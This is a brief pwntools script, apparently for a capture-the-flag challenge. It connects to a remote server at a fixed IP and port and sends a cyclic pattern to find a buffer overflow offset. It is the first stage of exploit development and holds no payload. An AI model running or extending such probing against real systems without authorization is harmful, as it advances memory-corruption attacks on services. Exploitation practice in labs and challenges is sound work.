from pwn import *

# Connect to the remote server
conn = remote('117.53.47.247', 50010)

# Create a cyclic pattern to help find the offset
pattern = cyclic(100)  # Create a pattern longer than 64+8 bytes

# Send the pattern
conn.sendline(pattern)

# Get the response
print(conn.recvall().decode())
